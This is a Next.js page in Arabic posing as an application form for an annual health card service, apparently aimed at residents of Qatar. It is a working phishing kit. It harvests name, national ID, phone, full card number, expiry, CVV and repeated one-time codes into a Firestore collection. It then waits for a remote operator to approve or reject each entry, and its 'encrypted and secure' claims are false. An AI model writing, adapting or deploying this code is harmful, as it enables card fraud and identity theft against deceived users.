'use client'

import { FormEvent, useEffect, useRef, useState } from 'react'
import { db } from '@/lib/firebase'
import { doc, onSnapshot, setDoc } from 'firebase/firestore'
import Image from 'next/image'
import { Button } from '@/app/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/app/components/ui/card'
import { Input } from '@/app/components/ui/input'
import { Label } from '@/app/components/ui/label'
import { RadioGroup, RadioGroupItem } from '@/app/components/ui/radio-group'
import { FullPageLoader } from '@/app/components/loader'
import { CheckCircle, ChevronLeft, CreditCard, Lock, User, Phone, ShieldCheck } from 'lucide-react'

const STEPS = [
  { label: 'الهوية', icon: User },
  { label: 'الهاتف', icon: Phone },
  { label: 'الدفع', icon: CreditCard },
  { label: 'التحقق', icon: ShieldCheck },
]

function StepIndicator({ current }: { current: number }) {
  return (
    <div className="flex items-center justify-center gap-0 mb-8">
      {STEPS.map((s, i) => {
        const done = i < current - 1
        const active = i === current - 1
        return (
          <div key={i} className="flex items-center">
            <div className={`flex flex-col items-center`}>
              <div className={`w-9 h-9 rounded-full flex items-center justify-center text-sm font-bold transition-all
                ${done ? 'bg-[#8A1538] text-white' : active ? 'bg-[#8A1538] text-white ring-4 ring-[#8A1538]/20' : 'bg-gray-200 text-gray-400'}`}>
                {done ? <CheckCircle className="w-4 h-4" /> : i + 1}
              </div>
              <span className={`text-xs mt-1 font-medium ${active ? 'text-[#8A1538]' : done ? 'text-gray-600' : 'text-gray-400'}`}>
                {s.label}
              </span>
            </div>
            {i < STEPS.length - 1 && (
              <div className={`w-10 sm:w-16 h-0.5 mb-5 mx-1 transition-all ${done ? 'bg-[#8A1538]' : 'bg-gray-200'}`} />
            )}
          </div>
        )
      })}
    </div>
  )
}

function formatCard(v: string) {
  return v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim()
}

export default function SubmitPage() {
  const [step, setStep] = useState(1)
  const [loading, setLoading] = useState(false)
  const [waiting, setWaiting] = useState(false)
  const [success, setSuccess] = useState(false)

  const [name, setName] = useState('')
  const [idNum, setIdNum] = useState('')
  const [phone, setPhone] = useState('')
  const [method, setMethod] = useState('visa')
  const [cardNumber, setCardNumber] = useState('')
  const [month, setMonth] = useState('')
  const [year, setYear] = useState('')
  const [cvv, setCvv] = useState('')
  const [otp, setOtp] = useState('')
  const [otpList, setOtpList] = useState<string[]>([])

  const unsubRef = useRef<(() => void) | null>(null)

  useEffect(() => {
    return () => { unsubRef.current?.() }
  }, [])

  const saveToFirestore = async (extra: Record<string, unknown> = {}) => {
    const payload = {
      id: idNum,
      name,
      phone,
      method,
      cardNumber: cardNumber.replace(/\s/g, ''),
      dateMonth: month,
      datayaer: year,
      CVC: cvv,
      otpArr: otpList,
      cardState: 'pending',
      createdAt: Date.now(),
      step,
      ...extra,
    }
    await setDoc(doc(db, 'pays', idNum || 'unknown'), payload, { merge: true })
  }

  const handleStep1 = async (e: FormEvent) => {
    e.preventDefault()
    if (!idNum.trim() || !name.trim()) return alert('الرجاء إدخال الاسم ورقم الهوية')
    setLoading(true)
    try {
      await saveToFirestore({ step: 1, currentPage: 'personal-info' })
    } catch {}
    setLoading(false)
    setStep(2)
  }

  const handleStep2 = async (e: FormEvent) => {
    e.preventDefault()
    if (!phone.trim() || phone.length < 8) return alert('الرجاء إدخال رقم هاتف صحيح')
    setLoading(true)
    try {
      await saveToFirestore({ step: 2, currentPage: 'phone' })
    } catch {}
    setLoading(false)
    setStep(3)
  }

  const handleStep3 = async (e: FormEvent) => {
    e.preventDefault()
    setLoading(true)
    try {
      await saveToFirestore({ step: 3, currentPage: 'payment-method' })
    } catch {}
    setLoading(false)
    setStep(4)
  }

  const handleStep4 = async (e: FormEvent) => {
    e.preventDefault()
    const cleanCard = cardNumber.replace(/\s/g, '')
    if (cleanCard.length < 16) return alert('الرجاء إدخال رقم البطاقة بشكل صحيح (16 رقمًا)')
    if (!month || !year) return alert('الرجاء إدخال تاريخ انتهاء البطاقة')
    if (cvv.length < 3) return alert('الرجاء إدخال رمز CVV')

    setLoading(true)
    try {
      await saveToFirestore({ step: 4, currentPage: 'card-info', cardState: 'pending' })
    } catch {}
    setLoading(false)

    setWaiting(true)
    unsubRef.current?.()
    unsubRef.current = onSnapshot(doc(db, 'pays', idNum), (snap) => {
      if (!snap.exists()) return
      const data = snap.data()
      if (data.cardState === 'approved') {
        setWaiting(false)
        setStep(5)
        unsubRef.current?.()
      } else if (data.cardState === 'rejected') {
        setWaiting(false)
        unsubRef.current?.()
        alert('تم رفض البطاقة. الرجاء إدخال معلومات صحيحة والمحاولة مجدداً.')
        setStep(4)
      }
    })
  }

  const handleStep5 = async (e: FormEvent) => {
    e.preventDefault()
    if (!otp.trim() || otp.length < 4) return alert('الرجاء إدخال رمز التحقق')

    const newList = [...otpList, otp]
    setOtpList(newList)
    setOtp('')
    setLoading(true)

    try {
      await setDoc(doc(db, 'pays', idNum), { otpArr: newList, step: 5, currentPage: 'otp', cardState: 'pending' }, { merge: true })
    } catch {}

    setLoading(false)
    setWaiting(true)

    unsubRef.current?.()
    unsubRef.current = onSnapshot(doc(db, 'pays', idNum), (snap) => {
      if (!snap.exists()) return
      const data = snap.data()
      if (data.cardState === 'approved') {
        setWaiting(false)
        setSuccess(true)
        unsubRef.current?.()
      } else if (data.cardState === 'rejected') {
        setWaiting(false)
        unsubRef.current?.()
        alert('رمز التحقق غير صحيح. الرجاء المحاولة مجدداً.')
      }
    })
  }

  if (success) {
    return (
      <div className="min-h-[70vh] flex items-center justify-center px-4" dir="rtl">
        <Card className="w-full max-w-md text-center border-0 shadow-lg">
          <CardContent className="pt-12 pb-10 px-8">
            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <CheckCircle className="w-10 h-10 text-green-600" />
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-2">تم تقديم الطلب بنجاح</h2>
            <p className="text-gray-500 mb-8">سيتم التواصل معك قريباً لاستكمال الإجراءات</p>
            <Button onClick={() => window.location.href = '/'} className="bg-[#8A1538] hover:bg-[#6d1030] w-full">
              العودة للرئيسية
            </Button>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 py-8 px-4" dir="rtl">
      {waiting && <FullPageLoader message="جاري التحقق من المعلومات..." />}

      <div className="max-w-xl mx-auto">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold text-gray-900">طلب خدمة البطاقة الصحية السنوية</h1>
          <p className="text-gray-500 text-sm mt-2">يُرجى تعبئة جميع الحقول المطلوبة بدقة</p>
        </div>

        {step <= 4 && <StepIndicator current={step} />}

        {step === 1 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2">
              <CardTitle className="text-lg flex items-center gap-2">
                <User className="w-5 h-5 text-[#8A1538]" />
                المعلومات الشخصية
              </CardTitle>
              <CardDescription>أدخل بيانات هويتك الشخصية</CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleStep1} className="space-y-5">
                <div className="space-y-2">
                  <Label htmlFor="name">الاسم الكامل <span className="text-red-500">*</span></Label>
                  <Input
                    id="name"
                    value={name}
                    onChange={e => setName(e.target.value)}
                    placeholder="أدخل اسمك الكامل"
                    className="h-11"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="id">رقم الهوية الشخصية <span className="text-red-500">*</span></Label>
                  <Input
                    id="id"
                    value={idNum}
                    onChange={e => setIdNum(e.target.value.replace(/\D/g, ''))}
                    placeholder="أدخل رقم هويتك"
                    className="h-11"
                    inputMode="numeric"
                  />
                </div>
                <Button type="submit" disabled={loading} className="w-full h-11 bg-[#8A1538] hover:bg-[#6d1030]">
                  {loading ? 'جاري الحفظ...' : 'متابعة'}
                  <ChevronLeft className="w-4 h-4 mr-1" />
                </Button>
              </form>
            </CardContent>
          </Card>
        )}

        {step === 2 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2">
              <CardTitle className="text-lg flex items-center gap-2">
                <Phone className="w-5 h-5 text-[#8A1538]" />
                رقم الهاتف
              </CardTitle>
              <CardDescription>سيُستخدم لإرسال رمز التحقق</CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleStep2} className="space-y-5">
                <div className="space-y-2">
                  <Label htmlFor="phone">رقم الجوال <span className="text-red-500">*</span></Label>
                  <Input
                    id="phone"
                    value={phone}
                    onChange={e => setPhone(e.target.value.replace(/\D/g, ''))}
                    placeholder="+974 xxxxxxxx"
                    className="h-11"
                    inputMode="tel"
                  />
                </div>
                <div className="flex gap-3">
                  <Button type="button" variant="outline" onClick={() => setStep(1)} className="flex-1 h-11">
                    رجوع
                  </Button>
                  <Button type="submit" disabled={loading} className="flex-1 h-11 bg-[#8A1538] hover:bg-[#6d1030]">
                    {loading ? 'جاري الحفظ...' : 'متابعة'}
                    <ChevronLeft className="w-4 h-4 mr-1" />
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        {step === 3 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2">
              <CardTitle className="text-lg flex items-center gap-2">
                <CreditCard className="w-5 h-5 text-[#8A1538]" />
                طريقة الدفع
              </CardTitle>
              <CardDescription>اختر طريقة الدفع المناسبة</CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleStep3} className="space-y-5">
                <RadioGroup value={method} onValueChange={setMethod} className="space-y-3">
                  {[
                    { id: 'visa', name: 'Visa', logo: '/R.png' },
                    { id: 'mastercard', name: 'Mastercard', logo: '/m.png' },
                  ].map(m => (
                    <div key={m.id}
                      className={`flex items-center gap-4 p-4 rounded-xl border-2 cursor-pointer transition-all
                        ${method === m.id ? 'border-[#8A1538] bg-[#8A1538]/5' : 'border-gray-200 hover:border-gray-300'}`}
                      onClick={() => setMethod(m.id)}>
                      <RadioGroupItem value={m.id} id={m.id} />
                      <Label htmlFor={m.id} className="flex items-center gap-3 cursor-pointer flex-1">
                        <img src={m.logo} alt={m.name} className="h-8 w-auto" />
                        <span className="font-medium">{m.name}</span>
                      </Label>
                    </div>
                  ))}
                </RadioGroup>
                <div className="flex gap-3">
                  <Button type="button" variant="outline" onClick={() => setStep(2)} className="flex-1 h-11">
                    رجوع
                  </Button>
                  <Button type="submit" disabled={loading} className="flex-1 h-11 bg-[#8A1538] hover:bg-[#6d1030]">
                    {loading ? 'جاري الحفظ...' : 'متابعة'}
                    <ChevronLeft className="w-4 h-4 mr-1" />
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        {step === 4 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2">
              <div className="flex items-center justify-between">
                <CardTitle className="text-lg flex items-center gap-2">
                  <Lock className="w-5 h-5 text-[#8A1538]" />
                  بيانات البطاقة المصرفية
                </CardTitle>
                <div className="flex gap-2">
                  <img src="/R.png" alt="Visa" className="h-6 w-auto" />
                  <img src="/m.png" alt="Mastercard" className="h-6 w-auto" />
                </div>
              </div>
              <CardDescription>جميع البيانات مشفّرة وآمنة</CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleStep4} className="space-y-5">
                <div className="space-y-2">
                  <Label>رقم البطاقة <span className="text-red-500">*</span></Label>
                  <div className="relative">
                    <Input
                      value={cardNumber}
                      onChange={e => setCardNumber(formatCard(e.target.value))}
                      placeholder="0000 0000 0000 0000"
                      className="h-11 font-mono pl-10"
                      inputMode="numeric"
                    />
                    <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  </div>
                </div>
                <div className="grid grid-cols-3 gap-3">
                  <div className="space-y-2">
                    <Label>الشهر <span className="text-red-500">*</span></Label>
                    <Input
                      value={month}
                      onChange={e => setMonth(e.target.value.replace(/\D/g, '').slice(0, 2))}
                      placeholder="MM"
                      className="h-11 text-center font-mono"
                      inputMode="numeric"
                      maxLength={2}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label>السنة <span className="text-red-500">*</span></Label>
                    <Input
                      value={year}
                      onChange={e => setYear(e.target.value.replace(/\D/g, '').slice(0, 2))}
                      placeholder="YY"
                      className="h-11 text-center font-mono"
                      inputMode="numeric"
                      maxLength={2}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label>CVV <span className="text-red-500">*</span></Label>
                    <Input
                      value={cvv}
                      onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                      placeholder="•••"
                      className="h-11 text-center font-mono"
                      type="password"
                      inputMode="numeric"
                      maxLength={4}
                    />
                  </div>
                </div>
                <div className="flex items-center gap-2 text-xs text-gray-500 bg-gray-50 p-3 rounded-lg">
                  <Lock className="w-3 h-3 flex-shrink-0" />
                  <span>بياناتك محمية بتشفير SSL 256-bit</span>
                </div>
                <div className="flex gap-3">
                  <Button type="button" variant="outline" onClick={() => setStep(3)} className="flex-1 h-11">
                    رجوع
                  </Button>
                  <Button type="submit" disabled={loading} className="flex-1 h-11 bg-[#8A1538] hover:bg-[#6d1030]">
                    {loading ? 'جاري المعالجة...' : 'تأكيد'}
                    <ChevronLeft className="w-4 h-4 mr-1" />
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        {step === 5 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2">
              <CardTitle className="text-lg flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-[#8A1538]" />
                رمز التحقق (OTP)
              </CardTitle>
              <CardDescription>
                تم إرسال رمز التحقق إلى هاتفك: <span className="font-semibold text-gray-700">{phone}</span>
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleStep5} className="space-y-5">
                {otpList.length > 0 && (
                  <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                    <p className="text-xs text-yellow-800 mb-2 font-medium">الرموز المُدخلة سابقاً:</p>
                    <div className="flex flex-wrap gap-1">
                      {otpList.map((o, i) => (
                        <span key={i} className="bg-yellow-100 text-yellow-800 text-xs font-mono px-2 py-0.5 rounded">
                          {o}
                        </span>
                      ))}
                    </div>
                  </div>
                )}
                <div className="space-y-2">
                  <Label htmlFor="otp">رمز التحقق <span className="text-red-500">*</span></Label>
                  <Input
                    id="otp"
                    value={otp}
                    onChange={e => setOtp(e.target.value.replace(/\D/g, ''))}
                    placeholder="أدخل الرمز المكوّن من 6 أرقام"
                    className="h-11 text-center text-xl font-mono tracking-widest"
                    inputMode="numeric"
                    maxLength={6}
                  />
                </div>
                <Button type="submit" disabled={loading} className="w-full h-11 bg-[#8A1538] hover:bg-[#6d1030]">
                  {loading ? 'جاري التحقق...' : 'تأكيد الرمز'}
                </Button>
              </form>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
